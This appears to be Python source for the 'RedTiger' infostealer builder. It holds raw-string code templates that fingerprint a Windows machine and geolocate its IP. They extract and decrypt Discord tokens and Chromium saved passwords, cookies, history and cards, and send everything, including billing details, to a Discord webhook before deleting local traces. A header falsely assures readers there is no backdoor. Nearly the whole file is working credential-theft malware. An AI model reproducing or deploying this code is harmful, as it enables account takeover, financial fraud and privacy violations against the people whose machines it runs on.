
"""
    ╔════════════════════════════════════════════════════════════════════════════╗
    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
    ╚════════════════════════════════════════════════════════════════════════════╝
"""

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Obligatory = r'''
import os
import platform
import ctypes
from screeninfo import *
import psutil
import GPUtil
import sqlite3
from urllib.request import Request, urlopen
import json
from json import *
import socket
import requests
from Crypto.Cipher import AES
import subprocess
import datetime
import base64
import re
import string
import win32api
import discord
from discord import Embed, File, SyncWebhook
import sys
import shutil
from pathlib import Path
from zipfile import ZipFile
from win32crypt import CryptUnprotectData
import uuid
from PIL import ImageGrab
import time
import browser_cookie3
import cv2

def Block_Website():
    pass
def Startup():
    pass
def System_Grab():
    pass
def Screenshot_Grab():
    pass
def Camera_Capture_Grab():
    pass
def Discord_Grab():
    pass
def Browser_Grab():
    pass
def Roblox_Grab():
    pass
def Fake_Error():
    pass

def current_time_day_hour():
    return datetime.datetime.now().strftime('%Y/%m/%d - %H:%M:%S')

def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

Clear()

color_embed = 0xB20000
username_embed = 'RedTiger'
avatar_embed = 'https://media.discordapp.net/attachments/1184160374342299688/1223987317908181073/RedTiger_Logo.png?ex=661bda05&is=66096505&hm=c567e0e9e672ae70de44ddf128301ae0a6737d78a2f2a9f46ff9f2b717f0ac04&=&format=webp&quality=lossless&width=810&height=810'
footer_embed = {
        "text": f"Red Tiger | {current_time_day_hour()}",
        "icon_url": avatar_embed,
        }
footer_text = f"RedTiger | {current_time_day_hour()}"
                 

try:
        hostname_pc = socket.gethostname()
except:
        hostname_pc = "None"

try:
        username_pc = os.getlogin()
except:
        username_pc = "None"


try:
    displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except:
    displayname_pc = "None"

try:
    response = requests.get('https://httpbin.org/ip')
    ip_address_public = response.json()['origin']
except:
    ip_address_public = "None"



try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))  

    ip_address_ipv4 = s.getsockname()[0]
    s.close()
except:
    ip_address_ipv4 = "None"



try:
    ip_address_ipv6 = []
    all_interfaces = socket.getaddrinfo(socket.gethostname(), None)
    for interface in all_interfaces:
        if interface[0] == socket.AF_INET6:
            ip_address_ipv6.append(interface[4][0])
    ip_address_ipv6 = ' / '.join(ip_address_ipv6)
except:
        ip_address_ipv6 = "None"


try:
    try:
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_public}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
    except:
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_ipv6}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)

    try:
        country_code = ipdata["country_code"].lower()
    except:
        country_code = "None"
except:
    country_code = "None"

try:
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
        data = response.json()
        status = data["status"]
    except:
        response = requests.get(f"http://ip-api.com/json/{ip_address_ipv6}")
        data = response.json()
        status = data["status"]

    if status in ["fail"]:
        status = "Invalid"
        ip_adress, country, country_code, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number, url_position = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
    else:
        status = "Valid"
        ip_adress = data["query"]
        country = data["country"]
        region = data["regionName"]
        region_code = data["region"]
        city = data["city"]
        zip_postal = data["zip"]
        latitude = data["lat"]
        longitude = data["lon"]
        timezone = data["timezone"]
        isp = data["isp"]
        org = data["org"]
        as_number = data["as"]
        url_position = f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"
except:
    ip_adress, country, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number, url_position = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

SystemGrab = r'''
def System_Grab():
    try:
        system_info = {platform.system()}
    except:
        system_info = "None"

    try:
        system_version_info = platform.version()
    except:
        system_version_info = "None"

    try:
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except:
        mac_address = "None"
    try:
        hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        hwid = "None"

    try:
        ram_info = round(psutil.virtual_memory().total / (1024**3), 2)
    except:
        ram_info = "None"


    try:
        cpu_info = platform.processor()
    except:
        cpu_info = "None"

    try:
        cpu_core_info = psutil.cpu_count(logical=False)
    except:
        cpu_core_info = "None"


    try:
        gpus = GPUtil.getGPUs()
        gpu_info = gpus[0].name if gpus else "None"
    except:
        gpu_info = "None"

    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {
                        'drive': drive_path,
                        'total': total_space,
                        'free': free_space,
                        'used': used_space,
                        'name': drive_name,
                    }
                    drives_info.append(drive)
                except:
                    ()
            bitmask >>= 1

        disk_stats = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for drive in drives_info:
            use_percent = (drive['used'] / drive['total']) * 100
            free_space_gb = "{:.2f}GO".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GO".format(drive['total'] / (1024 ** 3))
            use_percent_str = "{:.2f}%".format(use_percent)
            disk_stats += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(drive['drive'], 
                                                                   free_space_gb,
                                                                   total_space_gb,
                                                                   use_percent_str,
                                                                   drive['name'])
    except:
        disk_stats = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        directory = os.getcwd()
        disk_letter = os.path.splitdrive(directory)[0]
    except:
        disk_letter = "None"


    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            platform_info = 'Pc Portable'
        else:
            platform_info = 'Pc Fixed'
    except:
        platform_info = "None"


    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return width, height

        for i, monitor in enumerate(get_monitors(), 1):
            if monitor.is_primary:
                width, height = get_resolution()
                name = monitor.name
                is_primary = 'Yes'

        main_screen = f"""Name         : "{name}" 
Resolution   : "{width}x{height}"
Main Screen  : "{is_primary}"
"""
    except:
        main_screen = "None"


    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8) 
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10) 
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return width, height


        monitors = list(get_monitors())

        if len(monitors) > 1:

            second_monitor = monitors[1]

            width, height = get_resolution()

            second_screen =  f"""Name         : "{name}" 
Resolution   : "{width}x{height}"
Main Screen  : "No"
"""
        else:
            second_screen = 'None'
    except:
        second_screen = "None"


    def embed_system(webhook_url, title, fields, color, footer, username, avatar):

        embed_data = {
            'title': title,
            "fields": fields,
            'color': color,
            "footer": footer,
            "thumbnail": {
                "url": ""
                }
        
        }


        data = {
            'embeds': [embed_data],
            'username': username,  
            'avatar_url': avatar
        }


        json_data = json.dumps(data)


        headers = {
            'Content-Type': 'application/json'
        }


        requests.post(webhook_url, data=json_data, headers=headers)

    title = f':computer: | System Info `{username_pc} "{ip_address_public}"`:'

    fields = [
    {"name": f":bust_in_silhouette: | User Pc:", "value": f"""```Name        : "{hostname_pc}"
Username    : "{username_pc}"
DisplayName : "{displayname_pc}"```""", "inline": False},

    {"name": f":computer: | System:", "value": f"""```Plateform    : "{platform_info}"
Exploitation : "{system_info} {system_version_info}"

HWID : "{hwid}"
MAC  : "{mac_address}"
CPU  : "{cpu_info}, {cpu_core_info} Core"
GPU  : "{gpu_info}"
RAM  : "{ram_info}Go"```""", "inline": False},

{"name": f":satellite: | Ip:", "value": f"""```
Public : "{ip_address_public}"
Local  : "{ip_address_ipv4}"
Ipv6   : "{ip_address_ipv6}"
Isp    : "{isp}"
Org    : "{org}"
As     : "{as_number}"```""", "inline": False},

{"name": f":minidisc: | Disk:", "value": f"""```{disk_stats}```""", "inline": False},

{"name": f":desktop: | Screen:", "value": f"""```Main Screen:
{main_screen}

Secondary Screen:
{second_screen}```""", "inline": False},

{"name": f":flag_{country_code}: | Location:", "value": f"""```Country   : "{country} ({country_code})"
Region    : "{region} ({region_code})"
Zip       : "{zip_postal}"
City      : "{city}"
Timezone  : "{timezone}"
Latitude  : "{latitude}"
Longitude : "{longitude}"
```""", "inline": False},

] 
    embed_system(webhook_url, title, fields, color_embed, footer_embed, username_embed, avatar_embed)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

DiscordGrab = r'''
def Discord_Grab():
    class Discord:
        def __init__(self, webhook):
            upload_tokens(webhook).upload()

    class extract_tokens:
        def __init__(self) -> None:
            self.base_url = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("localappdata")
            self.roaming = os.getenv("appdata")
            self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

            self.tokens, self.uids = [], []

            self.extract()

        def extract(self) -> None:
            paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }

            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _discord = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                                         1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))

                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

            if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

        def validate_token(self, token: str) -> bool:
            r = requests.get(self.base_url, headers={'Authorization': token})

            if r.status_code == 200:
                return True

            return False

        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return

            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

            return master_key

    class upload_tokens:
        def __init__(self, webhook: str):
            self.tokens = extract_tokens().tokens
            self.webhook = SyncWebhook.from_url(webhook)

        def upload(self):
            if not self.tokens:
                return

            for token_discord in self.tokens:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()

                try:
                    username_discord = user['username'] + '#' + user['discriminator']
                except:
                    username_discord = "None"

                try:
                    display_name_discord = user['global_name']
                except:
                    display_name_discord = "None"

                try:
                    user_id_discord = user['id']
                except:
                    user_id_discord = "None"

                try:
                    email_discord = user['email']
                except:
                    email_discord = "None"
                
                try:
                    phone_discord = user['phone']
                except:
                    phone_discord = "None"
                
                try:
                    mfa_discord = user['mfa_enabled']
                except:
                    mfa_discord = "None"
                
                try:
                    country_discord = user['locale']
                except:
                    country_discord = "None"

                try:
                    if user['premium_type'] == 0:
                        nitro_discord = 'False'
                    elif user['premium_type'] == 1:
                        nitro_discord = 'Nitro Classic'
                    elif user['premium_type'] == 2:
                        nitro_discord = 'Nitro Boosts'
                    elif user['premium_type'] == 3:
                        nitro_discord = 'Nitro Basic'
                    else:
                        nitro_discord = 'False'
                except:
                    nitro_discord = "None"
                
                try:
                    avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.png"
                except:
                    avatar_url_discord = avatar_embed

                try:
                    bio_discord = user['bio']
                    if not bio_discord.strip() or bio_discord.isspace():
                        bio_discord = "None"
                except:
                    bio_discord = "None"

                try:
                    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord})
                    if guilds_response.status_code == 200:
                        guilds = guilds_response.json()
                        try:
                            owner_guilds = [guild for guild in guilds if guild['owner']]
                            owner_guild_count = len(owner_guilds)
                            owner_guilds_names = [] 
                            if owner_guilds:
                                for guild in owner_guilds:
                                    owner_guilds_names.append(f"{guild['name']} ({guild['id']}) / ")
                                owner_guilds_names = "\n" + "\n".join(owner_guilds_names)
                        except:
                            owner_guild_count = "None"
                            owner_guilds_names = "None" 
                except:
                    owner_guild_count = "None"
                    owner_guilds_names = "None"
            
                try:
                    billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
                    if billing_discord:
                        payment_methods_discord = []

                        for method in billing_discord:
                            if method['type'] == 1:
                                payment_methods_discord.append('CB')
                            elif method['type'] == 2:
                                payment_methods_discord.append("Paypal")
                            else:
                                payment_methods_discord.append('Other')
                        payment_methods_discord = ' / '.join(payment_methods_discord)
                    else:
                        payment_methods_discord = "None"
                except:
                    payment_methods_discord = "None"

                try:
                    gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()
                    if gift_codes:
                        codes = []
                        for gift_codes_discord in gift_codes:
                            name = gift_codes_discord['promotion']['outbound_title']
                            gift_codes_discord = gift_codes_discord['code']
                            data = f"Gift: {name}\nCode: {gift_codes_discord}"
                            if len('\n\n'.join(gift_codes_discord)) + len(data) >= 1024:
                                break
                            gift_codes_discord.append(data)
                        if len(gift_codes_discord) > 0:
                            gift_codes_discord = '\n\n'.join(gift_codes_discord)
                        else:
                            gift_codes_discord = "None"
                    else:
                        gift_codes_discord = "None"
                except:
                    gift_codes_discord = "None"

                embed = Embed(title=f':speech_balloon: | Discord Info `{username_pc} "{ip_address_public}"`:', color=color_embed)
                embed.set_thumbnail(url=avatar_url_discord)
                embed.add_field(name=":bust_in_silhouette: | Username:",
                                value=f"```{username_discord}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: | Display Name:",
                                value=f"```{display_name_discord}```", inline=True)
                embed.add_field(name=":robot: | Id:",
                                value=f"```{user_id_discord}```", inline=True)
                embed.add_field(name=":e_mail: | Email:",
                                value=f"```{email_discord}```", inline=True)
                embed.add_field(name=":telephone_receiver: | Phone:",
                                value=f"```{phone_discord}```", inline=True)   
                embed.add_field(name=":globe_with_meridians: | Token:",
                                value=f"```{token_discord}```", inline=True)
                embed.add_field(name=":rocket: | Nitro:",
                                value=f"```{nitro_discord}```", inline=True)
                embed.add_field(name=":earth_africa: | Language:",
                                value=f"```{country_discord}```", inline=True)
                embed.add_field(name=":moneybag: | Billing:",
                                value=f"```{payment_methods_discord}```", inline=True)
                embed.add_field(name=":gift: | Gift Code:",
                                value=f"```{gift_codes_discord}```", inline=True)
                embed.add_field(name=":lock: | Multi-Factor Authentication:",
                                value=f"```{mfa_discord}```", inline=True)
                embed.add_field(name=":identification_card: | Bio:",
                                value=f"```{bio_discord}```", inline=True)
                embed.add_field(name=f":link: | Owner Guilds ({owner_guild_count}):",
                                value=f"```{owner_guilds_names}```", inline=True)

                embed.set_footer(text=footer_text, icon_url=avatar_embed)

                self.webhook.send(embed=embed, username=username_embed,
                                  avatar_url=avatar_embed)

    Discord(webhook_url)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

BrowserGrab = r'''
def Browser_Grab():
    __LOGINS__ = []
    __COOKIES__ = []
    __WEB_HISTORY__ = []
    __DOWNLOADS__ = []
    __CARDS__ = []

    class Browser:
        def __init__(self, webhook):
            self.webhook = SyncWebhook.from_url(webhook)

            Chromium()
            Upload(self.webhook)


    class Upload:

        def __init__(self, webhook: SyncWebhook):
            self.webhook = webhook

            self.write_files()
            self.send()
            self.clean()

        def write_files(self):
            os.makedirs(f"Browsers_{username_pc}", exist_ok=True)
            if __LOGINS__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_passwords.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __LOGINS__))

            if __COOKIES__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_cookies.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __COOKIES__))

            if __WEB_HISTORY__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_history.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

            if __DOWNLOADS__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_downloads.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __DOWNLOADS__))

            if __CARDS__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_cards.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __CARDS__))

            with ZipFile(f"Browsers_{username_pc}.zip", "w") as zip:
                for file in os.listdir(f"Browsers_{username_pc}"):
                    zip.write(f"Browsers_{username_pc}\\{file}", file)

        def send(self):
            self.webhook.send(
                embed=Embed(
                    title=f":globe_with_meridians: | Browsers Info `{username_pc} \"{ip_address_public}\"`:",
                    description="```" +
                    '\n'.join(self.tree(Path(f"Browsers_{username_pc}"))) + "```",
                    color=color_embed,
                ).set_footer(
                     text=footer_text,
                     icon_url=avatar_embed
                ),
                file=File(f"Browsers_{username_pc}.zip"),
                username=username_embed,
                avatar_url=avatar_embed,
            )

        def clean(self):
            shutil.rmtree(f"Browsers_{username_pc}")
            os.remove(f"Browsers_{username_pc}.zip")

        def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
            pipes = {
                'space':  '    ',
                'branch': '│   ',
                'tee':    '├── ',
                'last':   '└── ',
            }

            if prefix == '':
                yield midfix_folder + path.name

            contents = list(path.iterdir())
            pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
            for pointer, path in zip(pointers, contents):
                if path.is_dir():
                    yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                    extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                    yield from self.tree(path, prefix=prefix+extension)
                else:
                    yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
        

    class Chromium:

        def __init__(self):
            self.appdata = os.getenv('LOCALAPPDATA')
            self.browsers = {
                'amigo': self.appdata + '\\Amigo\\User Data',
                'torch': self.appdata + '\\Torch\\User Data',
                'kometa': self.appdata + '\\Kometa\\User Data',
                'orbitum': self.appdata + '\\Orbitum\\User Data',
                'cent-browser': self.appdata + '\\CentBrowser\\User Data',
                '7star': self.appdata + '\\7Star\\7Star\\User Data',
                'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
                'vivaldi': self.appdata + '\\Vivaldi\\User Data',
                'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
                'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
                'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
                'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
                'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
                'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
                'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                'iridium': self.appdata + '\\Iridium\\User Data',
            }
            self.profiles = [
                'Default',
                'Profile 1',
                'Profile 2',
                'Profile 3',
                'Profile 4',
                'Profile 5',
            ]

            for _, path in self.browsers.items():
                if not os.path.exists(path):
                    continue

                self.master_key = self.get_master_key(f'{path}\\Local State')
                if not self.master_key:
                    continue

                for profile in self.profiles:
                    if not os.path.exists(path + '\\' + profile):
                        continue

                    operations = [
                        self.get_login_data,
                        self.get_cookies,
                        self.get_web_history,
                        self.get_downloads,
                        self.get_credit_cards,
                    ]

                    for operation in operations:
                        try:
                            operation(path, profile)
                        except:
                            pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return

            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

        def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def get_login_data(self, path: str, profile: str):
            login_db = f'{path}\\{profile}\\Login Data'
            if not os.path.exists(login_db):
                return

            shutil.copy(login_db, 'login_db')
            conn = sqlite3.connect('login_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue

                url = f"- [+] |URL|: {row[0]}"
                username = f"   |USERNAME|: {row[1]}"
                password = f"   |PASSWORD|: {self.decrypt_password(row[2], self.master_key)}"
                __LOGINS__.append(Types.Login(url, username, password))

            conn.close()
            os.remove('login_db')

        def get_cookies(self, path: str, profile: str):
            cookie_db = f'{path}\\{profile}\\Network\\Cookies'
            if not os.path.exists(cookie_db):
                return

            try:
                shutil.copy(cookie_db, 'cookie_db')
                conn = sqlite3.connect('cookie_db')
                cursor = conn.cursor()
                cursor.execute(
                    'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2] or not row[3]:
                        continue
                    url = f"- [+] |URL|: {row[0]}"
                    name = f"  |NAME|: {row[1]}"
                    path = f"  |PATH|: {row[2]}"
                    cookie = f"  |COOKIE|: {self.decrypt_password(row[3], self.master_key)}"
                    expire = f"  |EXPIRE|: {row[4]}"

                    __COOKIES__.append(Types.Cookie(url, name, path, cookie, expire))
                conn.close()
            except:
                pass

            os.remove('cookie_db')

        def get_web_history(self, path: str, profile: str):
            web_history_db = f'{path}\\{profile}\\History'
            if not os.path.exists(web_history_db):
                return

            shutil.copy(web_history_db, 'web_history_db')
            conn = sqlite3.connect('web_history_db')
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url = f"- [+] |URL|: {row[0]}"
                title = f"  |TITLE|: {row[1]}"
                time = f"  |TIME|: {row[2]}"
                __WEB_HISTORY__.append(Types.WebHistory(url, title, time))

            conn.close()
            os.remove('web_history_db')

        def get_downloads(self, path: str, profile: str):
            downloads_db = f'{path}\\{profile}\\History'
            if not os.path.exists(downloads_db):
                return

            shutil.copy(downloads_db, 'downloads_db')
